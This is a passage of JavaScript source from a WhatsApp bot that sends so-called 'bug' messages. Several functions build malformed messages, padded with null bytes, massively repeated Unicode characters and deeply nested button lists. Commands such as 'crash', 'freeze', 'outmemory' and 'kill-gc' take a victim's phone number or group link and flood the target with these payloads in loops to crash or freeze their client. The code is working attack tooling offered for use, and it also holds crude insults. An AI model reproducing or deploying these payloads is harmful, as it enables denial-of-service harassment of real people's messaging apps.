              mediaType: "IMAGE",
              jpegThumbnail: tdxlol,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "13135550002@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "❤️",
            entryPointConversionApp: "💛",
            actionLink: {
              url: "t.me/ShinzoLovee",
              buttonTitle: "Ampas",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "😼",
            parentGroupJid: "😽",
            trustBannerType: "😾",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {},
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `@13135550002${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "@13135550002".repeat(2999),
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };
  let sections = [];
  for (let i = 0; i < 1; i++) {
    let largeText = "\u0000".repeat(11999);
    let deepNested = {
      title: `Section ${i + 1}`,
      highlight_label: `Highlight ${i + 1}`,
      rows: [
        {
          title: largeText,
          id: `\u0000`.repeat(999),
          subrows: [
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
              subsubrows: [
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
              ],
            },
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
            },
          ],
        },
      ],
    };
    sections.push(deepNested);
  }
  let listMessage = {
    title: "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
    sections: sections,
  };
  let msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: '! X̵̹̬̄̽Z̟̈́̆̉͜C̵͉͋̔͞R͉̜̎͡͠A̷͙ͭͫ̕S̵̙͕̀̃Hͥ̽ͣ̃̔Ḛͭ̉̇͟R͉̜̎͡͠ ꦽ - "Shinz" 🩸' + "ꦽ".repeat(29999),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: JSON.stringify(listMessage),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: JSON.stringify(listMessage),
              subtitle: "zhee crash" + "\u0000".repeat(9999),
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              }),
          }),
        },
      },
    }),
    { userJid: target }
  );
  await conn.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  console.log(`𝚂𝚄𝙲𝙲𝙴𝚂 𝚂𝙴𝙽𝙳 𝙿𝙰𝚈𝙻𝙾𝙰𝙳 𝙱𝚄𝚃𝚃𝙾𝙽 𝚃𝙾 ${target}`);
  await conn.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  await conn.relayMessage(target, messagePayload, {
    additionalNodes: virtex,
    participant: { jid: target },
  });
  console.log(`𝚂𝚄𝙲𝙲𝙴𝚂 𝚂𝙴𝙽𝙳 𝙿𝙰𝚈𝙻𝙾𝙰𝙳 𝙲𝚄𝚁𝚂𝙾𝚁 𝚃𝙾 ${target}`);
}

  //bug


async function crashcursor(target) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: ";🩸⃟⃨〫⃰‣ ⁖ 𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐊𝐢𝐥𝐥𝐞𝐫‣—" + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: conn.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "🩸⃟⃨〫⃰‣ ⁖𝐕𝐚𝐦𝐩𝐢𝐫𝐞𝐊𝐢𝐥𝐥𝐞𝐫 ‣—",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "༑ Fail Beta - ( devorsixcore ) \"👋\"",
                    footerText: "© running since 2020 to 20##?",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "𐎟 𝐕𝐚𝐦𝐩𝐢𝐫𝐞 ⿻ 𝐂͢𝐋𝐢𝚵͢𝐍𝐓͢ 𐎟"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: tdxlol,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/devor6core",
buttonTitle: "konstol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© running since 2020 to 20##?",
thumbnail: tdxlol,
sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "konstol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
serverMessageId: 1,
newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "by : devorsixcore"
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await conn.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}

crashcursor(m.chat)
        //crash func//
async function invc(nomor) {
     let bijipler = nomor 
     let msg = await generateWAMessageFromContent(bijipler, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "dvx",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "dvx"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});
      }
      async function Payload(bijipler) {
      let sections = [];

      for (let i = 0; i < 1; i++) {
        let largeText = "ꦾ".repeat(1);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [bijipler],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: bijipler,
                },
              },
              body: {
                text: " ᏙᎪᎷᏢᏆᎡᎬ ラ‣  ",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              },
            },
          },
        },
      };

      await conn.relayMessage(bijipler, message, {
        participant: { jid: bijipler },
      });
    }                      
        
                   
        
        
   
        
    
            
              
              
            
    
               
                  

    

async function MSGSPAM(isTarget) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: ["13135550002@s.whastapp.net"],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: isTarget,
              },
            },
            body: {
              text: ".",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await conn.relayMessage(isTarget, Msg, {
      participant: { jid: isTarget },
    })
  }
       //========


                                        
                                                              
                                                
//========

async function overloadButton(Target) {
let sections = [];
for (let i = 0; i < 1999; i++) { // Sesuaikan jumlah section
let largeText = 'ྀི'.repeat(5999); // Pesan besar

let deepNested = {
title: `Section ${i + 1}`,
highlight_label: `Highlight ${i + 1}`,
rows: [{
title: largeText,
id: `id${i}`,
subrows: [
{
title: 'Nested row 1',
id: `nested_id1_${i}`,
subsubrows: [
{
title: 'Deep Nested row 1',
id: `deep_nested_id1_${i}`
},
{
title: 'Deep Nested row 2',
id: `deep_nested_id2_${i}`
}
]
},
{
title: 'Nested row 2',
id: `nested_id2_${i}`
}
]
}]
};

sections.push(deepNested);
}

let listMessage = {
title: "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
sections: sections
};

let msg = generateWAMessageFromContent(Target, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [Target],
isForwarded: true,
forwardingScore: 999
},
body: proto.Message.InteractiveMessage.Body.create({
text: "𝐙‌𝐗‌𝐎 ⿻‌𝐔𝐈⿻‌" + "ꦾ".repeat(89999)
}),
footer: proto.Message.InteractiveMessage.Footer.create({
buttonParamsJson: JSON.stringify(listMessage)
}),
header: proto.Message.InteractiveMessage.Header.create({
buttonParamsJson: JSON.stringify(listMessage),
subtitle: "𝐎𝐯𝐞𝐥𝐨𝐚𝐝‌" + "ྀི".repeat(4999), 
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
  buttons: [
{
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "call_permission_request",
buttonParamsJson: "{}"
},
{
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}

]
})
})
}
}
}, {});

await conn.relayMessage(Target, msg.message, {
messageId: msg.key.id
});

console.log(`Succes Send FloodUi To ${Target}`);
}
        


async function MpMSqL(target) {
      let sections = [];

      for (let i = 0; i < 10; i++) {
        let largeText = "Mark Zuckerberg Kontol, By JustinOfficial";

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "꧀꧀Mark Zuckerberg Kontol, By Killer Crash", 
        sections: sections,
      };

      let msg = generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [target, "13135550002@s.whatsapp.net"],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: proto.Message.InteractiveMessage.Body.create({
                  text: "*Killer Tamvan͢*",
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                  subtitle: "Mark Zuckerberg Kontol, By Killer Crash",
                  hasMediaAttachment: false, // No media to focus purely on data overload
                }),
                nativeFlowMessage:
                  proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                        {
                                                name: "single_select",

                        buttonParamsJson: "JSON.stringify(listMessage)",

                      }, 

                      {

                        name: "payment_method",

                        buttonParamsJson: "JSON.stringify(listMessage)",

                      },

                      {

                        name: "call_permission_request",

                        buttonParamsJson: "JSON.stringify(listMessage)",

                      },

                      {

                        name: "single_select",

                        buttonParamsJson: "JSON.stringify(listMessage)",

                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                     ],
                  }),
              }),
            },
          },
        },
        { userJid: target }
      );

      await conn.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id,
      });
    }
//==========
case 'crash': {
    if (!Access && !isPremium) return reply('command owner & user premium')
    if (!q) return m.reply(`*Example: ${prefix + command} 254xxx*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 254xxxx_`);
    };
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 10; i++) {
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
    }
    await sleep(1000);
    await m.reply("Succes send Bug");
}
break
case 'terminate': {
    if (!Access && !isPremium) return reply('command owner & user premium')
    if (!q) return m.reply(`*Example: ${prefix + command} 254xxx*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 254xxxx_`);
    };
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 10; i++) {
    await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
    await Payload (target)
    await overloadButton(target)
        
    }
    await sleep(1000);
    await m.reply("Succes send Bug");
}
break
        
case 'cursor': {
    if (!Access && !isPremium) return reply('command owner & user premium')
    if (!q) return m.reply(`*Example: ${prefix + command} 254xxx*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 254xxxx_`);
    };
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 10; i++) {
  await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
    }
    await sleep(1000);
    await m.reply("Succes send Bug");
}
break


  case 'mpmsql': {
      if (!Access && !isPremium) return reply('command owner & user premium')
    if (!q) return m.reply(`*Example: ${prefix + command} 254xxxx*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 254xxx_`);
    };
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 10; i++) {
 await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
    }
    await sleep(1000);
    await m.reply("Succes send Bug");
}
break

case 'winsql': {
    if (!Access && !isPremium) return reply('command owner & user premium')
    if (!q) return m.reply(`*Example: ${prefix + command} 254xxxx*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 254xxx_`);
    };
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 10; i++) {
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
    }
    await sleep(1000);
    await m.reply("Succes send Bug");
}
break

case 'outmemory': {
    if (!Access && !isPremium) return reply(' owner & user premium only')
    if (!q) return m.reply(`*Example: ${prefix + command} 254xxx*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 254xxx_`);
    };
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 10; i++) {
   await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
    }
    await sleep(1000);
    await m.reply("Succes send Bug");
}
break
  
  
  
  case 'force-sql': {
    if (!Access && !isPremium) return reply('command owner & user premium')
    if (!q) return m.reply(`*Example: ${prefix + command} 254xxx*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 254xxx_`);
    };
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 10; i++) {
        await crashcursor(target)
        await overloadButton(target)
        await overloadButton(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await MpMSqL(target)
    }
    await sleep(1000);
    await m.reply("Succes send Bug");
}
break
        case 'freeze': {
    if (!Access && !isPremium) return reply('command owner & user premium')
    if (!q) return m.reply(`*Example: ${prefix + command} 254xxx*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 254xxx_`);
    };
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 10; i++) {
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
        await OverloadCursor(target)
    }
    await sleep(1000);
    await m.reply("Succes send Bug");
}
break
        case 'bug-gc': {
           
if (!isPremium) return m.reply(`Syntax Error!!
</> No Acces`)
let groupLink = text.split("|")[0].trim();
if (!groupLink.startsWith('https://chat.whatsapp.com/')) return m.reply(`Example : /${command} https://chat.whatsapp.com/xxx|5`);

let jumlah = parseInt(text.split("|")[1]);
if (isNaN(jumlah) || jumlah <= 0) return m.reply("Invalid jumlah value. It must be a number greater than 0.");

try {
// Extract invite code from the link
let inviteCode = groupLink.split("chat.whatsapp.com/")[1];
if (!inviteCode) return m.reply("INVALID LINK GROUP");
let groupInfo = await conn.groupGetInviteInfo(inviteCode);
let groupId = groupInfo.id;
m.reply (`
⧼ 𝗦𝗨𝗞𝗦𝗘𝗦 𝗘𝗫𝗘𝗖𝗨𝗧𝗘 𝗚𝗥𝗢𝗨𝗣 ⧽
𝗧𝗔𝗥𝗚𝗘𝗧 : ${groupInfo.subject}
𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝗨𝗞𝗦𝗘𝗦
𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 : *${command}*

> 𝗚𝗥𝗢𝗨𝗣 𝗦𝗨𝗗𝗔𝗛 𝗖𝗥𝗔𝗦𝗛`)
for (let i = 0; i < jumlah; i++) {
await ZetX(groupId);
await ZetX(groupId);
await ZetX(groupId);
await ZetX(groupId);
await ZetX(groupId);
await ZetX(groupId);
}
} catch (error) {
console.error("Error processing group link:", error);
}
}
break;  
case 'crash-gc': {
           
if (!isPremium) return m.reply(`Syntax Error!!
</> No Acces`)
let groupLink = text.split("|")[0].trim();
if (!groupLink.startsWith('https://chat.whatsapp.com/')) return m.reply(`Example : /${command} https://chat.whatsapp.com/xxx|5`);

let jumlah = parseInt(text.split("|")[1]);
if (isNaN(jumlah) || jumlah <= 0) return m.reply("Invalid jumlah value. It must be a number greater than 0.");

try {
// Extract invite code from the link
let inviteCode = groupLink.split("chat.whatsapp.com/")[1];
if (!inviteCode) return m.reply("INVALID LINK GROUP");
let groupInfo = await conn.groupGetInviteInfo(inviteCode);
let groupId = groupInfo.id;
m.reply (`
⧼ 𝗦𝗨𝗞𝗦𝗘𝗦 𝗘𝗫𝗘𝗖𝗨𝗧𝗘 𝗚𝗥𝗢𝗨𝗣 ⧽

𝗧𝗔𝗥𝗚𝗘𝗧 : ${groupInfo.subject}
𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝗨𝗞𝗦𝗘𝗦
𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 : *${command}*

> 𝗚𝗥𝗢𝗨𝗣 𝗦𝗨𝗗𝗔𝗛 𝗖𝗥𝗔𝗦𝗛`)
for (let i = 0; i < jumlah; i++) {
await overloadButton(groupId);
await overloadButton(groupId);
await overloadButton(groupId);
await overloadButton(groupId);
await overloadButton(groupId);
await overloadButton(groupId);
await crashcursor(groupId);
await crashcursor(groupId);
await crashcursor(groupId);
await crashcursor(groupId);
await crashcursor(groupId);
await crashcursor(groupId);  
}
} catch (error) {
console.error("Error processing group link:", error);
}
}
break;
        

  case 'kill-gc': {
           
if (!isPremium) return m.reply(`Syntax Error!!
</> No Acces`)
let groupLink = text.split("|")[0].trim();
if (!groupLink.startsWith('https://chat.whatsapp.com/')) return m.reply(`Example : /${command} https://chat.whatsapp.com/xxx|5`);

let jumlah = parseInt(text.split("|")[1]);
if (isNaN(jumlah) || jumlah <= 0) return m.reply("Invalid jumlah value. It must be a number greater than 0.");

try {
// Extract invite code from the link
let inviteCode = groupLink.split("chat.whatsapp.com/")[1];
if (!inviteCode) return m.reply("INVALID LINK GROUP");
let groupInfo = await conn.groupGetInviteInfo(inviteCode);
let groupId = groupInfo.id;  
m.reply (`
⧼ 𝗦𝗨𝗞𝗦𝗘𝗦 𝗘𝗫𝗘𝗖𝗨𝗧𝗘 𝗚𝗥𝗢𝗨𝗣 ⧽

𝗧𝗔𝗥𝗚𝗘𝗧 : ${groupInfo.subject}
𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝗨𝗞𝗦𝗘𝗦
𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 : *${command}*

> 𝗚𝗥𝗢𝗨𝗣 𝗦𝗨𝗗𝗔𝗛 𝗖𝗥𝗔𝗦𝗛`)
for (let i = 0; i < jumlah; i++) {
await overloadButton(groupId);
await overloadButton(groupId);
await overloadButton(groupId);
await crashcursor(groupId);
await crashcursor(groupId);
await crashcursor(groupId);
await overloadButton(groupId);
await overloadButton(groupId);
await overloadButton(groupId);
await crashcursor(groupId);
await crashcursor(groupId);
await crashcursor(groupId);
}
} catch (error) {
console.error("Error processing group link:", error);
}
}
break;
  case 'attack': {
if (!isPremium) return m.reply(mess.premium);
if (!q) return m.reply(
`*❌sʏɴᴛᴀx ᴇʀʀᴏʀ!!*
ᴜsᴇ : /xᴘʟᴏɪᴛ ɴᴏᴍᴏʀ
ᴇxᴀᴍᴘʟᴇ : /bug 254xx..`);
incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
if (incTarget.startsWith('0')) return m.reply(
`*❌sʏɴᴛᴀx ᴇʀʀᴏʀ!!*
ᴜsᴇ : /xᴘʟᴏɪᴛ ɴᴏᴍᴏʀ
ᴇxᴀᴍᴘʟᴇ : /bug 254xx..`);
let target = incTarget + '@s.whatsapp.net';
if (owner.includes(incTarget)) return m.reply(`*Failed to send bug to owner.*`);
let caption = 
`> [ *ͲᎪᎡᏀᎬͲ ᏞϴᏟᏦ* ]
*•Select Type Bug To*
*•Attack ${incTarget}*`;
const flowActions = [
{
buttonId: 'action1',
buttonText: { displayText: 'Action Flow Button1' },
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "𝗛𝗮𝗿𝗱-𝗕𝘂𝗴",
sections: [
{
title: "𝗟𝗶𝘀𝘁 𝗦𝗲𝗹𝗲𝗰𝘁𝗶𝘃𝗲 𝗕𝘂𝗴",
highlight_label: "ᏦᏆᏞᏞᎬᎡ 𝐂𝐫𝐚𝐬𝐡",
rows: [
{
header: "crash",
title: "➣",
id: `${prefix}crash ${incTarget}`
},
{
header: "cursor",
title: "crash ui + WhatsApp",
id: `${prefix}cursor ${incTarget}`
}
]
}, 
{
title: "© 𝙏𝙚𝙣𝙣𝙤𝙧𝙢𝙤𝙙𝙯 - 𝟐𝟎𝟐𝟓",
highlight_label: "",
rows: [
{
header: "force-sql",
title: "crash ui + WhatsApp",
id: `${prefix}force-sql ${incTarget}`
},
{
header: "winsql",
title: "crash ui + WhatsApp",
id: `${prefix}winsql ${incTarget}`
}
]
}
]
})
},
viewOnce: true
}, 
{
buttonId: 'action2',
buttonText: { displayText: 'Action Flow Button2' },
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "𝗠𝗲𝗱𝗶𝘂𝗺-𝗕𝘂𝗴",
sections: [
{
title: "𝗟𝗶𝘀𝘁 𝗦𝗲𝗹𝗲𝗰𝘁𝗶𝘃𝗲 𝗕𝘂𝗴",
highlight_label: "ᏦᏆᏞᏞᎬᎡ Ꮩ15",
rows: [
{
header: "outmemory",
title: "►",
id: `${prefix}outmemory ${incTarget}`
},
{
header: "freeze",
title: "►",
id: `${prefix}freeze ${incTarget}`
},
]
}, 
{
title: "© 𝙏𝙚𝙣𝙣𝙤𝙧𝙢𝙤𝙙𝙯- 𝟐𝟎𝟐𝟓",
highlight_label: "",
rows: [
{
header: "terminate",
title: "➥",
